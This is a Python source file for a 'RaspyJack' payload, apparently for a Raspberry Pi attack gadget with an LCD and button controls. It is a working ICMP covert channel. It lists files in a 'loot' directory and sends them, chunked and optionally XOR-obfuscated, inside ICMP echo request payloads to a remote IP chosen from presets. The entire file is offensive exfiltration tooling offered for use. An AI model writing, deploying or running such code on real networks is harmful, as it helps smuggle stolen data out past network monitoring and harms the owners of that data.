#!/usr/bin/env python3
"""
RaspyJack Payload -- ICMP Covert Channel
==========================================
Author: 7h30th3r0n3

Encodes data into ICMP echo request payloads and sends to a
configurable remote IP.  Supports file transfer and optional XOR
encryption.

Setup / Prerequisites:
  - Configure target IP (the receiving machine must capture ICMP payloads).
  - Optional XOR encryption key.

Controls:
  OK          -- Start transfer
  UP / DOWN   -- Navigate file list / mode
  KEY1        -- Toggle XOR encryption
  KEY2        -- Set target IP (cycle presets)
  KEY3        -- Exit

Uses scapy for ICMP packet crafting.
"""

import os
import sys
import json
import time
import hashlib
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_BASE = "/root/Raspyjack/loot"
CHUNK_SIZE = 48
XOR_KEY = b"R4spy_J4ck!"

PRESET_TARGETS = [
    "10.0.0.1",
    "192.168.1.1",
    "172.16.0.1",
]

ROWS_VISIBLE = 7
ROW_H = 12

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
transferring = False
stop_flag = False
status_msg = "Idle"
scroll_pos = 0
target_idx = 0
target_ip = PRESET_TARGETS[0]
encrypt_on = False

bytes_sent = 0
chunks_sent = 0
total_chunks = 0

file_list = []


# ---------------------------------------------------------------------------
# File enumeration
# ---------------------------------------------------------------------------

def _scan_loot_files():
    found = []
    for root, _dirs, files in os.walk(LOOT_BASE):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                size = os.path.getsize(fpath)
                if size > 0:
                    rel = os.path.relpath(fpath, LOOT_BASE)
                    found.append({"path": fpath, "rel": rel, "size": size})
            except Exception:
                pass
    found.sort(key=lambda x: x["rel"])
    return found


# ---------------------------------------------------------------------------
# XOR encryption
# ---------------------------------------------------------------------------

def _xor_bytes(data, key):
    """XOR data with repeating key. Returns new bytes."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


# ---------------------------------------------------------------------------
# ICMP transfer
# ---------------------------------------------------------------------------

def _build_header(seq, total, file_hash):
    """4-byte header: 2B seq + 2B total, then 8B hash prefix."""
    hdr = seq.to_bytes(2, "big") + total.to_bytes(2, "big")
    hdr += file_hash[:8].encode("ascii")
    return hdr


def _do_transfer(fpath):
    """Send file via ICMP echo requests in background."""
    global transferring, status_msg, bytes_sent, chunks_sent
    global total_chunks, stop_flag

    try:
        from scapy.all import IP, ICMP, send as scapy_send
    except ImportError:
        with lock:
            status_msg = "scapy not installed"
            transferring = False
        return

    with lock:
        transferring = True
        stop_flag = False
        bytes_sent = 0
        chunks_sent = 0
        status_msg = "Reading file..."

    try:
        with open(fpath, "rb") as f:
            raw = f.read()
    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:16]}"
            transferring = False
        return

    file_hash = hashlib.sha256(raw).hexdigest()
    chunks = []
    for i in range(0, len(raw), CHUNK_SIZE):
        chunks.append(raw[i:i + CHUNK_SIZE])

    with lock:
        total_chunks = len(chunks)
        status_msg = f"Sending {total_chunks} pkts..."
        dst = target_ip
        do_encrypt = encrypt_on

    for seq, chunk_data in enumerate(chunks):
        with lock:
            if stop_flag:
                status_msg = "Cancelled"
                break

        payload = _build_header(seq, len(chunks), file_hash)
        if do_encrypt:
            payload += _xor_bytes(chunk_data, XOR_KEY)
        else:
            payload += chunk_data

        try:
            pkt = IP(dst=dst) / ICMP(type=8, id=0xBEEF, seq=seq) / payload
            scapy_send(pkt, verbose=False)
        except Exception as exc:
            with lock:
                status_msg = f"Send err: {str(exc)[:12]}"
            break

        with lock:
            chunks_sent = seq + 1
            bytes_sent += len(chunk_data)
            status_msg = f"Pkt {seq + 1}/{total_chunks}"

        time.sleep(0.02)

    with lock:
        if not stop_flag and "err" not in status_msg.lower():
            status_msg = f"Done: {bytes_sent}B sent"
        transferring = False


def start_transfer(fpath):
    with lock:
        if transferring:
            return
    threading.Thread(target=_do_transfer, args=(fpath,), daemon=True).start()


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00CCFF")
    with lock:
        active = transferring
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_main():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "ICMP TUNNEL")

    with lock:
        status = status_msg
        sc = scroll_pos
        bs = bytes_sent
        cs = chunks_sent
        tc = total_chunks
        active = transferring
        enc = encrypt_on
        dst = target_ip

    enc_str = "XOR" if enc else "RAW"
    d.text((2, 15), f"T:{dst[:15]} [{enc_str}]", font=font, fill="#888")

    if active:
        d.text((2, 28), status[:22], font=font, fill="#FFAA00")
        progress = cs / tc if tc > 0 else 0
        bar_w = int(100 * progress)
        d.rectangle((14, 42, 114, 50), outline="#444")
        d.rectangle((14, 42, 14 + bar_w, 50), fill="#00AA44")
        d.text((2, 54), f"{bs}B sent", font=font, fill="#CCCCCC")
        d.text((2, 66), f"Pkt {cs}/{tc}", font=font, fill="#CCCCCC")
    elif not file_list:
        d.text((10, 45), "No loot files found", font=font, fill="#666")
    else:
        visible = file_list[sc:sc + ROWS_VISIBLE - 1]
        for i, entry in enumerate(visible):
            y = 28 + i * ROW_H
            marker = ">" if i == 0 else " "
            color = "#FFFF00" if i == 0 else "#CCCCCC"
            name = entry["rel"][:18]
            sz_k = entry["size"] / 1024
            d.text((1, y), f"{marker}{name} {sz_k:.0f}k"[:22], font=font, fill=color)

    _draw_footer(d, f"OK:Send K1:Enc K2:IP")
    LCD.LCD_ShowImage(img, 0, 0)


def _show_message(line1, line2=""):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((10, 50), line1, font=font, fill="#00FF00")
    if line2:
        d.text((4, 65), line2, font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global scroll_pos, target_idx, target_ip, encrypt_on
    global stop_flag, file_list

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 20), "ICMP TUNNEL", font=font, fill="#00CCFF")
    d.text((4, 40), "Covert channel via", font=font, fill="#888")
    d.text((4, 52), "ICMP echo payloads", font=font, fill="#888")
    d.text((4, 72), "OK=Send  K1=Encrypt", font=font, fill="#666")
    d.text((4, 84), "K2=Target  K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.3)

    file_list = _scan_loot_files()

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                with lock:
                    stop_flag = True
                break

            if btn == "OK":
                with lock:
                    active = transferring
                if active:
                    with lock:
                        stop_flag = True
                elif file_list and scroll_pos < len(file_list):
                    start_transfer(file_list[scroll_pos]["path"])
                time.sleep(0.3)

            elif btn == "KEY1":
                encrypt_on = not encrypt_on
                state = "ON (XOR)" if encrypt_on else "OFF (raw)"
                _show_message("Encrypt:", state)
                time.sleep(0.2)

            elif btn == "KEY2":
                target_idx = (target_idx + 1) % len(PRESET_TARGETS)
                target_ip = PRESET_TARGETS[target_idx]
                _show_message("Target:", target_ip)
                time.sleep(0.2)

            elif btn == "UP":
                scroll_pos = max(0, scroll_pos - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll_pos = min(max(0, len(file_list) - 1), scroll_pos + 1)
                time.sleep(0.15)

            draw_main()
            time.sleep(0.05)

    finally:
        with lock:
            stop_flag = True
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
